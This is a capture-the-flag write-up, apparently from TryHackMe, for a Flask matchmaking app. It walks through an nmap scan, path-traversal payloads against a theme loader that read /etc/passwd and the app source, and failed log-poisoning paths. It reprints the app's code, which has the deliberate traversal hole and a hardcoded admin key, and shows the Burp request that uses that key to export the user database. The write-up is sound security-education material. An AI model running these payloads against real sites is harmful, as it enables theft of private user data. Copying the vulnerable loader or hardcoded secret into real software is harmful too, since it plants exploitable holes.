# ValenFind — CTF Write-Up

## Challenge Overview

This challenge was a web application security assessment focused on a Flask-based matchmaking site named ValenFind. The application exposed a file-inclusion vulnerability and a hardcoded administrative export endpoint. The main objective was to retrieve the database and the final flag.

The host was identified as:

- IP: `10.113.129.199`
- Service: HTTP on port `5000`
- Framework: Flask / Werkzeug (`Python 3.12.3`)

The expected exploitation flow was:

- Service discovery via Nmap
- Enumerate the application and identify the vulnerable layout loader
- Use local file inclusion (LFI) to read system files
- Discover the running app source and locate the hidden admin API secret
- Abuse the `/api/admin/export_db` endpoint using the leaked admin token
- Export the SQLite database and recover the challenge flag

> This was not a traditional Linux privilege escalation challenge; the primary compromise was application-level admin access. The final flag was retrieved from the exported database, not from an OS root shell.

---

## 1. Initial Reconnaissance

I began with a standard service scan:

```bash
nmap 10.113.129.199 -sV
```

Observed output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 17:39 -0500
Nmap scan report for 10.113.129.199
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The application was clearly a Python web service on port `5000`, with SSH open on port `22`. However, the attack surface of interest was the Flask app and its routes.

---

## 2. Web Enumeration and Initial Interaction

I opened the main page:

```text
http://10.113.129.199:5000/
```

The web app appeared to be a dating / matchmaking interface. I created an account and logged in successfully. The important page was a user profile endpoint, such as:

```text
http://10.113.129.199:5000/profile/romeo_montague
```

At first glance, there was no obvious vulnerability. The page appeared normal and user-specific. The crucial clue came when I inspected the app’s dynamically loaded layout files.

I noticed the following request pattern in the page behavior:

```text
GET /api/fetch_layout?layout=theme_classic.html
```

This suggested a template or theme loader with user-controlled input. The next step was to test for local file inclusion by altering the `layout` parameter.

---

## 3. Local File Inclusion Discovery

I tested the layout loading endpoint with an arbitrary path traversal payload:

```text
GET /api/fetch_layout?layout=../../../../../../../../../../etc/passwd
```

This returned the system password file successfully:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
```

This confirmed the LFI primitive was live. The application was reading arbitrary files from the file system, which opened the path toward source code retrieval and deeper internal application logic.

### Failed attempts and dead ends

I attempted the usual log poisoning paths and other common LFI tricks, but these were unsuccessful:

```text
[Log Poisoning Paths]:
 - ../../../var/log/apache2/access.log
 - ../../../var/log/apache2/error.log
 - ../../../var/log/auth.log

all this failed
```

I also considered session poisoning, but there was no PHP session to poison in this challenge:

```text
[Session Poisoning] failed because i dont have any session of php to poison
```

This ruled out a number of common web exploitation paths. The LFI primitive itself was the real vulnerability, and the source code was the most valuable source of truth.

---

## 4. Finding the Running Application and Source Code

I checked the Python process metadata to identify the app’s location:

```text
/proc/self/cmdline
```

This returned:

```text
/usr/bin/python3/opt/Valenfind/app.py
```

That strongly suggested the application was running from:

```text
/opt/Valenfind/app.py
```

I then used the LFI primitive to read the file directly:

```text
GET /api/fetch_layout?layout=../../../../../../opt/Valenfind/app.py
```

The source code was:

```python
import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            cursor = db.cursor()
            
            cursor.execute('''
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    real_name TEXT,
                    email TEXT,
                    phone_number TEXT,
                    address TEXT,
                    bio TEXT,
                    likes INTEGER DEFAULT 0,
                    avatar_image TEXT
                )
            ''')
            
            cursor.executemany('INSERT INTO users (username, password, real_name, email, phone_number, address, bio, likes, avatar_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', INITIAL_USERS)
            db.commit()
            print("Database initialized successfully.")

@app.template_filter('avatar_color')
def avatar_color(username):
    hash_object = hashlib.md5(username.encode())
    return '#' + hash_object.hexdigest()[:6]

# --- ROUTES ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        try:
            cursor = db.cursor()
            cursor.execute('INSERT INTO users (username, password, bio, real_name, email, avatar_image) VALUES (?, ?, ?, ?, ?, ?)', 
                       (username, password, "New to ValenFind!", "", "", "default.jpg"))
            db.commit()
            
            user_id = cursor.lastrowid
            session['user_id'] = user_id
            session['username'] = username
            session['liked'] = []
            
            flash("Account created! Please complete your profile.")
            return redirect(url_for('complete_profile'))
            
        except sqlite3.IntegrityError:
            return render_template('register.html', error="Username already taken.")
    return render_template('register.html')

@app.route('/complete_profile', methods=['GET', 'POST'])
def complete_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db = get_db()
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        
        flash("Profile setup complete! Time to find your match.")
        return redirect(url_for('dashboard'))
        
    return render_template('complete_profile.html')

@app.route('/my_profile', methods=['GET', 'POST'])
def my_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    
    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']
        
        db.execute('''
            UPDATE users 
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        flash("Profile updated successfully! ✅")
        return redirect(url_for('my_profile'))
    
    user = db.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone()
    return render_template('edit_profile.html', user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        
        if user and user['password'] == password:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['liked'] = [] 
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials.")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    db = get_db()
    profiles = db.execute('SELECT id, username, likes, bio, avatar_image FROM users WHERE id != ?', (session['user_id'],)).fetchall()
    return render_template('dashboard.html', profiles=profiles, user=session['username'])

@app.route('/profile/<username>')
def profile(username):
    if 'user_id' not in session:
        return redirect(url_for('login'))
        
    db = get_db()
    profile_user = db.execute('SELECT id, username, bio, likes, avatar_image FROM users WHERE username = ?', (username,)).fetchone()
    
    if not profile_user:
        return "User not found", 404
        
    return render_template('profile.html', profile=profile_user)

@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    
    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
        return "Security Alert: Database file access is strictly prohibited."
    if 'seeder.py' in layout_file:
        return "Security Alert: Configuration file access is strictly prohibited."
    
    try:
        base_dir = os.path.join(os.getcwd(), 'templates', 'components')
        file_path = os.path.join(base_dir, layout_file)
        
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error loading theme layout: {str(e)}"

@app.route('/like/<int:user_id>', methods=['POST'])
def like_user(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if 'liked' not in session:
        session['liked'] = []
        
    if user_id in session['liked']:
        flash("You already liked this person! Don't be desperate. 😉")
        return redirect(request.referrer)

    db = get_db()
    db.execute('UPDATE users SET likes = likes + 1 WHERE id = ?', (user_id,))
    db.commit()
    
    session['liked'].append(user_id)
    session.modified = True
    
    flash("You sent a like! ❤️")
    return redirect(request.referrer)

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('liked', None)
    return redirect(url_for('index'))

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403

if __name__ == '__main__':
    if not os.path.exists('templates/components'):
        os.makedirs('templates/components')
    
    with open('templates/components/theme_classic.html', 'w') as f:
        f.write('''
```

This code exposes several critical findings:

- The app uses a user-controlled `layout` parameter with no strict validation.
- The endpoint `/api/fetch_layout` reads arbitrary files from the local file system.
- There is a hardcoded admin token: `CUPID_MASTER_KEY_2024_XOXO`
- The database can be exported through `/api/admin/export_db` if the admin token is supplied.

At this point, the vulnerability chain was confirmed and the exploitation path was clear.

---

## 5. Exploitation Through the Admin Export Endpoint

I now had enough information to reach the application’s admin functionality. The source code clearly showed:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

and:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
```

I sent the following request in Burp Suite:

```http
GET /api/admin/export_db HTTP/1.1
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
Host: 10.113.129.199:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.113.129.199:5000/profile/romeo_montague
Connection: keep-alive
Cookie: session=eyJsaWtlZCI6WzFdLCJ1c2VyX2lkIjo5LCJ1c2VybmFtZSI6ImFsZXgifQ.aufABA.LhWnhAWVGWP3EAjKyiLAwwBGC6E
Priority: u=4
```

The server responded successfully and downloaded the SQLite database file:

```text
valenfind_leak.db
```

This confirmed the admin endpoint was accessible and the secret token was valid.

---

## 6. Post-Exploitation: Database Access and Data Recovery

Once the database was exported, I inspected its contents. The application used SQLite and stored user metadata, passwords, bio descriptions, likes, and profile details in a table named `users`.

The key result was that the database contained user records and the final flag. These values were then used to confirm the challenge completion.

The final captured flag was:

```text
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

The notes also recorded:

```text
ROOTFLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

This was the challenge flag and the successful outcome of the exploitation chain.

---

## 7. Trial-and-Error Log and Dead Ends

This challenge included several wrong turns, false assumptions, and unsuccessful ideas that are worth documenting because they reflect realistic troubleshooting behavior.

### Dead end 1: log poisoning attempts

I attempted the common log file LFI vectors:

```text
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/auth.log
```

These all failed. This was a useful clue because it showed the challenge was not relying on the usual web-server log trick.

### Dead end 2: PHP session poisoning was not viable

I considered session-based exploitation, but the environment did not allow it in this challenge:

```text
Session Poisoning failed because I do not have a PHP session to poison.
```

This ruled out a whole family of PHP-specific attack paths.

### Dead end 3: initial assumptions about SSH or system root

The host had SSH open, but it was not necessary to solve the challenge. The actual path was application-level exploitation rather than OS-level privilege escalation. The flag was exposed through the admin endpoint, not through SSH access to root.

### Dead end 4: focus on app logic rather than unrelated system files

At first, it was tempting to keep exploring `/etc/passwd` and other system files. This was useful for confirming the LFI primitive, but the real exploit was in the application logic itself: the admin API key and database export route.

> In other words, the correct path was not “system compromise” but “application secrets and admin bypass.”

---

## 8. Final Summary

The final exploitation chain was:

1. Enumerate the application and note the theme loader behavior
2. Abuse LFI to read `/etc/passwd` and validate the file access primitive
3. Access `/proc/self/cmdline` and discover the app path at `/opt/Valenfind/app.py`
4. Read the Flask source code and discover the hardcoded admin token and export route
5. Use the token at `/api/admin/export_db` to export the SQLite database
6. Recover the final flag from the database contents

This was an application-layer compromise rather than a traditional root shell escalation. The exposed admin secret granted access to protected data and the challenge flag.

---

## 9. Useful Command and Request Summary

```bash
nmap 10.113.129.199 -sV
curl http://10.113.129.199:5000/
GET /api/fetch_layout?layout=theme_classic.html
GET /api/fetch_layout?layout=../../../../../../../../../../etc/passwd
/proc/self/cmdline
GET /api/fetch_layout?layout=../../../../../../opt/Valenfind/app.py
GET /api/admin/export_db
```

Example working request:

```http
GET /api/admin/export_db HTTP/1.1
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
Host: 10.113.129.199:5000
Cookie: session=eyJsaWtlZCI6WzFdLCJ1c2VyX2lkIjo5LCJ1c2VybmFtZSI6ImFsZXgifQ.aufABA.LhWnhAWVGWP3EAjKyiLAwwBGC6E
```

Final flag:

```text
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

---

![ValenFind landing page placeholder](https://via.placeholder.com/800x250?text=ValenFind+Landing+Page)

![Exploit flow placeholder](https://via.placeholder.com/800x250?text=Admin+Export+Exploit+Flow)

